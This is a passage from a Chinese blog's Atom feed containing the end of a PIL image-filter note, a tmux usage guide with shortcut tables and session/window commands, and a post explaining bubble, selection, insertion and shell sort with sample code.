模块。</p></blockquote><p><code>示例：过滤图像</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageFilter</span><br><span class="line"></span><br><span class="line">im1 = im.filter(ImageFilter.BLUR)</span><br><span class="line">im2 = im.filter(ImageFilter.MinFilter(<span class="number">3</span>))</span><br><span class="line">im3 = im.filter(ImageFilter.MinFilter)  <span class="comment"># same as MinFilter(3)</span></span><br></pre></td></tr></table></figure><p><code>过滤器</code></p><p>库的当前版本提供了以下一组预定义的图像增强过滤器：</p><ul><li><strong>BLUR</strong></li><li><strong>CONTOUR</strong></li><li><strong>DETAIL</strong></li><li><strong>EDGE_ENHANCE</strong></li><li><strong>EDGE_ENHANCE_MORE</strong></li><li><strong>EMBOSS</strong></li><li><strong>FIND_EDGES</strong></li><li><strong>SHARPEN</strong></li><li><strong>SMOOTH</strong></li><li><strong>SMOOTH_MORE</strong></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-导入库的的方式&quot;&gt;&lt;a href=&quot;#0x00-导入库的的方式&quot; class=&quot;headerlink&quot; title=&quot;0x00 导入库的的方式&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;0x00 导入库的的方式&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Tmux工具使用总结</title>
    <link href="https://muzibing.github.io/2020/08/29/2020.08.29%EF%BC%88147%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/29/2020.08.29（147）/</id>
    <published>2020-08-28T16:00:00.000Z</published>
    <updated>2020-10-13T03:04:14.146Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-tmux简介font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-tmux简介font"></a> <font color="navy"><code>0x00 Tmux简介</code></font></h3><blockquote><p>tmux是一款优秀的终端复用软件，它比Screen更加强大，至于如何强大，网上有大量的文章讨论了这点，本文不再重复。tmux之所以受人们喜爱，主要得益于以下三处功能：</p><ul><li><code>丝滑分屏（split）</code>：虽然iTem2也提供了横向和竖向分屏功能，但这种分屏功能非常拙劣，完全等同于屏幕新开一个窗口，新开的pane不会自动进入到当前目录，也没有记住当前登录状态。这意味着如果我ssh进入到远程服务器时，iTem2新开的pane中，我依然要重新走一遍ssh登录的老路（omg）。tmux就不会这样，tmux窗口中，新开的pane，默认进入到之前的路径，如果是ssh连接，登录状态也依旧保持着，如此一来，我就可以随意的增删pane，这种灵活性，好处不言而喻。</li><li><code>保护现场（attach）</code>：即使命令行的工作只进行到一半，关闭终端后还可以重新进入到操作现场，继续工作。对于ssh远程连接而言，即使网络不稳定也没有关系，掉线后重新连接，可以直奔现场，之前运行中的任务，依旧在跑，就好像从来没有离开过一样；特别是在远程服务器上运行耗时的任务，tmux可以帮你一直保持住会话。如此一来，你就可以随时随地放心地进行移动办公，只要你附近的计算机装有tmux（没有你也可以花几分钟装一个），你就能继续刚才的工作。</li><li><code>会话共享（适用于结对编程或远程教学）</code>，将 tmux 会话的地址分享给他人，这样他们就可以通过 SSH 接入该会话。如果你要给同事演示远程服务器的操作，他不必直勾勾地盯着你的屏幕，借助tmux，他完全可以进入到你的会话，然后静静地看着他桌面上你风骚的键盘走位，只要他愿意，甚至还可以录个屏。</li></ul></blockquote><h3 id="font-color-navy0x01-tmux快捷指令font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-tmux快捷指令font"></a> <font color="navy"><code>0x01 Tmux快捷指令</code></font></h3><blockquote><p>关于快捷指令，首先要认识到的是：tmux的所有指令，都包含同一个前缀，默认为<code>Ctrl+b</code>，输入完前缀过后，控制台激活，命令按键才能生效。</p></blockquote><p><code>表一：系统指令</code></p><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>?</code></td><td style="text-align:center">显示快捷键帮助文档</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>d</code></td><td style="text-align:center">断开当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>D</code></td><td style="text-align:center">选择要断开的会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+z</code></td><td style="text-align:center">挂起当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>r</code></td><td style="text-align:center">强制重载当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>s</code></td><td style="text-align:center">显示会话列表用于选择并切换</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>:</code></td><td style="text-align:center">进入命令行模式，此时可直接输入<code>ls</code>等命令</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>[</code></td><td style="text-align:center">进入复制模式，按<code>q</code>退出</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>]</code></td><td style="text-align:center">粘贴复制模式中复制的文本</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>~</code></td><td style="text-align:center">列出提示信息缓存</td></tr></tbody></table><p><code>表二：窗口（window）指令。</code></p><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>c</code></td><td style="text-align:center">新建窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>&amp;</code></td><td style="text-align:center">关闭当前窗口（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>0~9</code></td><td style="text-align:center">切换到指定窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>p</code></td><td style="text-align:center">切换到上一窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>n</code></td><td style="text-align:center">切换到下一窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>w</code></td><td style="text-align:center">打开窗口列表，用于且切换窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>,</code></td><td style="text-align:center">重命名当前窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>.</code></td><td style="text-align:center">修改当前窗口编号（适用于窗口重新排序）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>f</code></td><td style="text-align:center">快速定位到窗口（输入关键字匹配窗口名称）</td></tr></tbody></table><p><code>表三：面板（pane）指令</code></p><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>&quot;</code></td><td style="text-align:center">当前面板上下一分为二，下侧新建面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>%</code></td><td style="text-align:center">当前面板左右一分为二，右侧新建面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>x</code></td><td style="text-align:center">关闭当前面板（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>z</code></td><td style="text-align:center">最大化当前面板，再重复一次按键后恢复正常（v1.8版本新增）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>!</code></td><td style="text-align:center">将当前面板移动到新的窗口打开（原窗口中存在两个及以上面板有效）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>;</code></td><td style="text-align:center">切换到最后一次使用的面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>q</code></td><td style="text-align:center">显示面板编号，在编号消失前输入对应的数字可切换到相应的面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>{</code></td><td style="text-align:center">向前置换当前面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>}</code></td><td style="text-align:center">向后置换当前面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+o</code></td><td style="text-align:center">顺时针旋转当前窗口中的所有面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>方向键</code></td><td style="text-align:center">移动光标切换面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>o</code></td><td style="text-align:center">选择下一面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>空格键</code></td><td style="text-align:center">在自带的面板布局中循环切换</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Alt+方向键</code></td><td style="text-align:center">以5个单元格为单位调整当前面板边缘</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+方向键</code></td><td style="text-align:center">以1个单元格为单位调整当前面板边缘（Mac下被系统快捷键覆盖）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>t</code></td><td style="text-align:center">显示时钟</td></tr></tbody></table><h3 id="font-color-navy0x02-会话管理font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-会话管理font"></a> <font color="navy"><code>0x02 会话管理</code></font></h3><blockquote><p>新建会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux new -s &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>分离会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux detach</span></span><br></pre></td></tr></table></figure><blockquote><p>查看会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux ls</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> or</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux list-session</span></span><br></pre></td></tr></table></figure><blockquote><p>接入会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux attach -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux attach -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>杀死会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux <span class="built_in">kill</span>-session -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux <span class="built_in">kill</span>-session -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>切换会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux switch -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux switch -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>重命名会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux rename-session -t 0 &lt;new-name&gt;</span></span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x03-窗口管理font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-窗口管理font"></a> <font color="navy"><code>0x03 窗口管理</code></font></h3><blockquote><p>划分窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 划分上下两个窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux split-window</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 划分左右两个窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux split-window -h</span></span><br></pre></td></tr></table></figure><blockquote><p>移动光标</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到上方窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -U</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到下方窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -D</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到左边窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -L</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到右边窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -R</span></span><br></pre></td></tr></table></figure><blockquote><p>交换窗口位置</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 当前窗格上移</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux swap-pane -U</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当前窗格下移</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux swap-pane -D</span></span><br></pre></td></tr></table></figure><blockquote><p>新建窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux new-window</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个指定名称的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux new-window -n &lt;window-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>切换窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 切换到指定编号的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-window -t &lt;window-number&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换到指定名称的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-window -t &lt;window-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>重命名窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux rename-window &lt;new-name&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> 参考文献</h3><p><a href="http://louiszhai.github.io/2017/09/30/tmux/#%E4%BC%9A%E8%AF%9D%E5%85%B1%E4%BA%AB" target="_blank" rel="noopener">Tmux使用手册</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-tmux简介font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-tmux简介font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>算法总结（C）</title>
    <link href="https://muzibing.github.io/2020/08/28/2020.08.28%EF%BC%88146%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/28/2020.08.28（146）/</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2020-09-17T10:34:06.100Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-orangec-排序算法font"><a class="markdownIt-Anchor" href="#font-color-orangec-排序算法font"></a> <font color="orange"><code>C 排序算法</code></font></h2><hr><h3 id="font-color-navy0x00-冒泡排序font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-冒泡排序font"></a> <font color="navy"><code>0x00 冒泡排序</code></font></h3><p><img src="/images/146-2.png" alt></p><h4 id="1算法思想"><a class="markdownIt-Anchor" href="#1算法思想"></a> <code>1.算法思想</code></h4><p>冒泡排序的基本思想就是：</p><blockquote><p>从无序序列头部开始，进行两两比较，根据大小交换位置，直到最后将最大（小）的数据元素交换到了无序队列的队尾，从而成为有序序列的一部分；下一次继续这个过程，直到所有数据元素都排好序。</p><p>算法的核心在于每次通过两两比较交换位置，选出剩余无序序列里最大（小）的数据元素放到队尾。</p></blockquote><h4 id="2图解算法"><a class="markdownIt-Anchor" href="#2图解算法"></a> <code>2.图解算法</code></h4><p><img src="/images/146-1.gif" alt></p><h4 id="3算法实现"><a class="markdownIt-Anchor" href="#3算法实现"></a> <code>3.算法实现</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubble_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++)</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                temp = arr[j];</span><br><span class="line">                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123; <span class="number">22</span>, <span class="number">34</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">82</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">64</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">70</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> len = (<span class="keyword">int</span>) <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(*arr);</span><br><span class="line">    bubble_sort(arr, len);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, arr[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-选择排序font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-选择排序font"></a> <font color="navy"><code>0x01 选择排序</code></font></h3><p><img src="/images/146-4.jpg" alt></p><h4 id="1算法思想-2"><a class="markdownIt-Anchor" href="#1算法思想-2"></a> <code>1.算法思想</code></h4><blockquote><p>它的工作原理如下。首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p></blockquote><h4 id="2图解算法-2"><a class="markdownIt-Anchor" href="#2图解算法-2"></a> <code>2.图解算法</code></h4><p><img src="/images/146-3.gif" alt></p><h4 id="3算法实现-2"><a class="markdownIt-Anchor" href="#3算法实现-2"></a> <code>3.算法实现</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span> <span class="comment">//交換兩個變數</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selection_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; len - <span class="number">1</span> ; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> min = i;</span><br><span class="line">        <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; len; j++)     <span class="comment">//走訪未排序的元素</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j] &lt; arr[min])    <span class="comment">//找到目前最小值</span></span><br><span class="line">                min = j;    <span class="comment">//紀錄最小值</span></span><br><span class="line">        swap(&amp;arr[min], &amp;arr[i]);    <span class="comment">//做交換</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4算法分析"><a class="markdownIt-Anchor" href="#4算法分析"></a> <code>4.算法分析</code></h4><p>表现最稳定的排序算法之一，因为无论什么数据进去都是O(n2)的时间复杂度，所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。理论上讲，选择排序可能也是平时排序一般人想到的最多的排序方法了吧。</p><h3 id="font-color-navy0x02-插入排序font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-插入排序font"></a> <font color="navy"><code>0x02 插入排序</code></font></h3><h4 id="1算法思想-3"><a class="markdownIt-Anchor" href="#1算法思想-3"></a> <code>1.算法思想</code></h4><blockquote><p>插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p></blockquote><h4 id="2图解算法-3"><a class="markdownIt-Anchor" href="#2图解算法-3"></a> <code>2.图解算法</code></h4><p><img src="/images/146-5.gif" alt></p><h4 id="3算法实现-3"><a class="markdownIt-Anchor" href="#3算法实现-3"></a> <code>3.算法实现</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertionSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.length;</span><br><span class="line">    <span class="keyword">var</span> preIndex, current;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">        preIndex = i - <span class="number">1</span>;</span><br><span class="line">        current = arr[i];</span><br><span class="line">        <span class="keyword">while</span>(preIndex &gt;= <span class="number">0</span> &amp;&amp; arr[preIndex] &gt; current) &#123;</span><br><span class="line">            arr[preIndex + <span class="number">1</span>] = arr[preIndex];</span><br><span class="line">            preIndex--;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[preIndex + <span class="number">1</span>] = current;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-算法分析"><a class="markdownIt-Anchor" href="#4-算法分析"></a> <code>4 算法分析</code></h4><p>插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p><h3 id="0x03-希尔排序"><a class="markdownIt-Anchor" href="#0x03-希尔排序"></a> <code>0x03 希尔排序</code></h3><h4 id="1算法思想-4"><a class="markdownIt-Anchor" href="#1算法思想-4"></a> <code>1.算法思想</code></h4><blockquote><p><strong>希尔排序是把记录按下标的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法便终止。</strong></p></blockquote><p>简单插入排序很循规蹈矩，不管数组分布是怎么样的，依然一步一步的对元素进行比较，移动，插入，比如[5,4,3,2,1,0]这种倒序序列，数组末端的0要回到首位置很是费劲，比较和移动元素均需n-1次。而<strong>希尔排序在数组中采用跳跃式分组的策略</strong>，通过某个增量将数组元素划分为若干组，然后分组进行插入排序，随后逐步缩小增量，继续按组进行插入排序操作，直至增量为1。希尔排序通过这种策略使得整个数组在初始阶段达到从宏观上看基本有序，小的基本在前，大的基本在后。然后缩小增量，到增量为1时，其实多数情况下只需微调即可，不会涉及过多的数据移动。</p><h4 id="2图解算法-4"><a class="markdownIt-Anchor" href="#2图解算法-4"></a> <code>2.图解算法</code></h4><p><img src="/images/146-6.png" alt></p><center>图一</center><p><img src="/images/146-7.gif" alt></p><center>图二</center><h4 id="3算法实现-4"><a class="markdownIt-Anchor" href="#3算法实现-4"></a> <code>3.算法实现</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellSort</span><span class="params">(a)</span>:</span></span><br><span class="line">    length = len(a)</span><br><span class="line">    gap = length // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> gap:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(gap, length):</span><br><span class="line">            j = i</span><br><span class="line">            <span class="keyword">while</span> (j-gap) &gt;= <span class="number">0</span> <span class="keyword">and</span> a[j] &lt; a[j-gap]:</span><br><span class="line">                temp = a[j-gap]</span><br><span class="line">                a[j-gap] = a[j]</span><br><span class="line">                a[j] = temp</span><br><span class="line">                j -= gap</span><br><span class="line">        gap = gap // <span class="number">2</span></span><br><span class="line">    print(<span class="string">"[+] "</span>,a)</span><br></pre></td></tr></table></figure><h4 id="4算法分析-2"><a class="markdownIt-Anchor" href="#4算法分析-2"></a> <code>4.算法分析</code></h4><blockquote><p>希尔排序的核心在于间隔序列的设定。既可以提前设定好间隔序列，也可以动态的定义间隔序列。动态定义间隔序列的算法是《算法（第4版）》的合著者Robert Sedgewick提出的。</p></blockquote><h3 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> <code>参考文献</code></h3><p><a 